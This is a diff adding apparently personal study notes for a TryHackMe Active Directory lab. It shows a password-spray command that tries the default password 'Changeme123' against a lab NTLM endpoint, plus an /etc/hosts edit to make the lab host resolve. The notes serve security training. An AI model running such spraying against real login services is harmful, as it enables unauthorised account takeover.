@@ -1381,10 +1381,53 @@ Privilege Escalation
 
 
 
+
+<details>
+  <summary>practical</summary>
+
+
+```
+cd /root/Rooms/BreachingAD/task3/
+```
+
+
+<img width="1030" height="172" alt="image" src="https://github.com/user-attachments/assets/bf2d85a7-3b65-488b-96ea-60cd014e7a7a" />
+
+
+````
+python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
+````
+
+## at first it not work when i 
+
+```
+echo "10.200.70.201 ntlmauth.za.tryhackme.com" >> /etc/hosts
+```
+
+## it work 
+
+<img width="1828" height="695" alt="image" src="https://github.com/user-attachments/assets/ece98fe5-887f-4387-b7ff-6bb0f5a196d4" />
+
+
+
+  
+</details>
  
 
 
+----
 
+<details>
+  <summary>LDAP Bind Credentials</summary>
+
+
+
+
+
+
+
+  
+</details>
 
 
 
